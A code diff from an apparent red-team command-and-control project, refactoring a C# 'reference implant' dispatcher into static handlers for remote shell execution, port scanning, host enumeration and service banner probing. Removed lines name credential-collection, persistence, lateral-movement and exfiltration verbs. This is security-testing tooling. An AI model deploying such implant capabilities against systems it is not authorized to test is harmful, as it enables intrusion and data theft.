@@ -3,25 +3,23 @@ using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// Dispatches the capability verbs the reference implant advertises
-// (architecture.md Sec 10): the shell.exec core verb, the recon.portscan /
-// recon.hostenum / recon.service recon verbs, and the lateral.move child-
-// derivation verb; the persist, collect, and exfil verbs live in their own
-// handler classes. The runner is the dispatch point future verbs (file.push,
-// probe.read, ...) extend.
+// Holds the core-category handlers the reference implant registers in its
+// handler registry (architecture.md Sec 5.3, Sec 10.1): shell.exec, and the
+// recon.portscan / recon.hostenum / recon.service recon verbs. Each is a plain
+// static method; the registry registers it as a CapabilityHandler in
+// HandlerRegistry.Default, so dispatch never reaches a hard-coded switch here.
 //
-// This is a benign reference runner: it shells out to the platform shell and
-// documented administration tools only. It performs no evasion, no obfuscation,
-// and no destructive behavior (RESPONSIBLE-USE.md, architecture.md Sec 7); the
-// operator is responsible for targeting only systems they are authorized to test
-// (RESPONSIBLE-USE.md).
+// These are benign reference handlers: they shell out to the platform shell
+// and documented administration tools only. They perform no evasion, no
+// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
+// Sec 7); the operator is responsible for targeting only systems they are
+// authorized to test (RESPONSIBLE-USE.md).
 
 /// <summary>
 /// Carries the inputs the lateral.move handler needs to derive a child implant
@@ -44,10 +42,10 @@ internal sealed class EnrollBundle
 }
 
 /// <summary>
-/// Dispatches capability verbs. Safe for concurrent use: each Dispatch call runs
-/// an independent process or its own socket set.
+/// The core-category handlers. Each Dispatch call runs an independent process or
+/// its own socket set, so concurrent invocations are safe.
 /// </summary>
-internal sealed class Runner
+internal static class Core
 {
     // Per-port dial timeout for the network-touching recon verbs. Short so a
     // wide port range finishes promptly; long enough that a reachable port on a
@@ -56,59 +54,6 @@ internal sealed class Runner
 
     // How long a service-probe waits for a banner after connecting.
     private static readonly TimeSpan BannerTimeout = TimeSpan.FromMilliseconds(500);
-
-    private readonly EnrollBundle? _enroll;
-
-    public Runner()
-        => _enroll = null;
-
-    /// <summary>
-    /// Builds a runner whose lateral.move handler derives a child against the
-    /// given enroll bundle (architecture.md Sec 10.1).
-    /// </summary>
-    public Runner(EnrollBundle enroll)
-        => _enroll = enroll;
-
-    /// <summary>
-    /// Runs <paramref name="verb"/> against <paramref name="arguments"/> and
-    /// returns the wire outcome, the captured output (combined stdout/stderr),
-    /// and any out-of-band exfil chunks the handler produced. An unknown verb
-    /// reports Failed with a clear message rather than throwing, so the operator
-    /// sees the cause. The chunks list is non-empty only for verbs that stream
-    /// bytes alongside the task result (exfil.push); the beacon loop writes the
-    /// TaskResult first, then iterates the chunks as ExfilChunk frames
-    /// (architecture.md Sec 10.1 exfil). All current handlers return an empty
-    /// list.
-    /// </summary>
-    public (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Dispatch(
-        string verb, string arguments)
-    {
-        return verb switch
-        {
-            "shell.exec" => WithNoChunks(ShellExec(arguments)),
-            "recon.portscan" => WithNoChunks(PortScan(arguments)),
-            "recon.hostenum" => WithNoChunks(HostEnum(arguments)),
-            "recon.service" => WithNoChunks(ServiceProbe(arguments)),
-            "lateral.move" => WithNoChunks(Lateral.Move(arguments, _enroll)),
-            "lateral.token" => WithNoChunks(Lateral.Token(arguments)),
-            "lateral.exec_remote" => WithNoChunks(Lateral.ExecRemote(arguments)),
-            "persist.install" => WithNoChunks(Persist.Install(arguments)),
-            "persist.remove" => WithNoChunks(Persist.Remove(arguments)),
-            "persist.list" => WithNoChunks(Persist.List(arguments)),
-            "collect.file" => Collect.File(arguments),
-            "collect.cred" => Collect.Cred(arguments),
-            "exfil.push" => Exfil.Push(arguments),
-            "exfil.stage" => Exfil.Stage(arguments),
-            _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
-        };
-    }
-
-    // Lifts a (outcome, output) pair into the three-tuple with an empty chunk
-    // list, so each handler keeps its two-value return shape and only the
-    // dispatcher knows about the out-of-band channel.
-    private static (TaskOutcome, string, IReadOnlyList<ExfilChunk>) WithNoChunks(
-        (TaskOutcome Outcome, string Output) result)
-        => (result.Outcome, result.Output, Array.Empty<ExfilChunk>());
 
     // The shell.exec task budget: a command that outlives it is killed so a
     // hung task cannot block the beacon's dispatch loop indefinitely (dispatch
@@ -120,7 +65,7 @@ internal sealed class Runner
     // operator sees the cause; the shell itself failing to start is also Failed;
     // a command that outlives the task budget is killed whole-tree and reported
     // as timed out.
-    private static (TaskOutcome, string) ShellExec(string command)
+    public static (TaskOutcome, string) ShellExec(string command)
     {
         var (shell, flag) = PlatformShell();
         var psi = new ProcessStartInfo
@@ -170,7 +115,7 @@ internal sealed class Runner
     // one line per open port ("<host>:<port> open"). Arguments are
     // "<host> <start-end>". Malformed arguments yield Failed; a closed range
     // yields Succeeded with empty output, the same convention as the Go implant.
-    private static (TaskOutcome, string) PortScan(string arguments)
+    public static (TaskOutcome, string) PortScan(string arguments)
     {
         if (!TryParseScanArgs(arguments, out var host, out var startPort, out var endPort))
             return (TaskOutcome.Failed, "recon.portscan expects '<host> <start-end>'");
@@ -188,7 +133,7 @@ internal sealed class Runner
     // non-loopback unicast addresses on each interface. It introspects the
     // running host and never probes a remote one, so the optional argument is
     // informational only.
-    private static (TaskOutcome, string) HostEnum(string _)
+    public static (TaskOutcome, string) HostEnum(string arguments)
     {
         var sb = new StringBuilder();
         sb.Append("hostname=").AppendLine(TryHostName(out var hostname) ? hostname : "(unknown)");
@@ -222,7 +167,7 @@ internal sealed class Runner
     // an open port, and reports one line per port as "<host>:<port> <banner>".
     // Arguments are "<host> <port[,port2,...]>". The outcome is Succeeded if at
     // least one port was open, Failed otherwise.
-    private static (TaskOutcome, string) ServiceProbe(string arguments)
+    public static (TaskOutcome, string) ServiceProbe(string arguments)
     {
         if (!TryParseServiceArgs(arguments, out var host, out var ports))
             return (TaskOutcome.Failed, "recon.service expects '<host> <port[,port2,...]>'");
@@ -381,4 +326,3 @@ internal sealed class Runner
         public static readonly char[] Space = { ' ' };
     }
 }
-
